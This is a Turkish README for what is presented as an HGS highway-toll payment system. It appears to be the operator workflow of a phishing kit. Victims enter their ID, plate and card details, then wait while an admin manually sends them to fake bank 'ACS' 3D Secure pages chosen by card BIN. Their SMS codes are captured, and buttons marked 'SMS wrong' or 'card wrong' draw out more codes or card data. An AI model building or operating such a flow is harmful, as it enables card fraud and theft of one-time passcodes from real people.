# HGS Ödeme Sistemi - Çok Aşamalı Onay Akışı

## Kullanıcı Akışı

### 1. Başlangıç (index.php)
- Kullanıcı TC/Plaka bilgisi girer
- Session oluşturulur
- Database'de user kaydı oluşturulur
- Status: `NULL` → `pending` (screen3.php'de kart bilgisi girilince)
- **redirect_url: NULL** (admin yönlendirene kadar bekler)

### 2. Bekle Ekranı (bekle.php) - İlk Bekleme
- Kullanıcı bekle ekranında kalır
- Her 2 saniyede `application-moderate.php` ile status kontrolü yapar
- **SADECE redirect_url dolu ise yönlendirilir**
- Admin "SMS Gönder" butonuna basana kadar burada bekler
- **Admin Panelde Durum: "waiting"**

### 3. Admin SMS Gönder
- Admin panelden "SMS Gönder" butonuna tıklar
- `redirect_url` = `3dredirect.php` olarak set edilir
- Kullanıcı otomatik olarak 3D sayfasına yönlendirilir

### 4. 3D Secure Sayfası
- BIN kontrolü yapılır
- Bankaya göre ilgili ACS sayfasına yönlendirilir
- Kullanıcı SMS kodunu girer
- Status: `sms_waiting` olur
- **redirect_url: NULL** olarak temizlenir
- Tekrar `bekle.php`'ye yönlendirilir
- **Admin Panelde Durum: "sms"**

### 5. Bekle Ekranı - İkinci Bekleme
- Kullanıcı tekrar bekle ekranında
- Admin kararını bekler
- **redirect_url NULL olduğu için beklemede kalır**

### 6. Admin Kararı (3 Seçenek)

#### A) ✓ Başarılı
- Status: `approved`
- redirect_url: `success.php`
- Kullanıcı başarı sayfasına yönlendirilir
- **Admin Panelde Durum: "success"**

#### B) SMS Hatalı
- Status: `sms_waiting` (değişmez)
- redirect_url: `acs/diger.php?hata=true`
- Kullanıcı tekrar SMS sayfasına gider (hata mesajı ile)
- Yeni SMS kodu `sms_code2` kolonuna kaydedilir
- SMS girişi sonrası redirect_url NULL olur
- Tekrar bekle.php'ye döner
- **Admin Panelde Durum: "sms"**

#### C) Kart Hatalı
- Status: `rejected_card`
- redirect_url: `error_card.php`
- Kullanıcı hata sayfasına yönlendirilir
- Kart bilgilerini düzenleyebilir
- **Admin Panelde Durum: "error-card"**

## Admin Panel Durum Gösterimi

| payment_status | Admin Panelde Görünen | Butonlar |
|----------------|----------------------|----------|
| pending | waiting | SMS Gönder |
| sms_waiting | sms | ✓ Başarılı, SMS Hatalı, Kart Hatalı |
| approved | success | - |
| rejected_card | error-card | - |

## Kritik Noktalar

✓ Kullanıcı **asla** kendi kendine yönlendirilmez
✓ Yönlendirme **sadece** admin aksiyonu ile olur
✓ Her yönlendirme sonrası `redirect_url` NULL'a çekilir
✓ bekle.php sadece `redirect_url` dolu ve boş değilse yönlendirir

## Test Adımları

1. Kullanıcı olarak sisteme giriş yap
2. Bilgileri doldur, bekle ekranına gel → **Durum: waiting**
3. Admin panelden "SMS Gönder" tıkla
4. 3D sayfasında SMS gir → Tekrar bekle ekranına dön → **Durum: sms**
5. Admin panelden 3 seçenekten birini test et

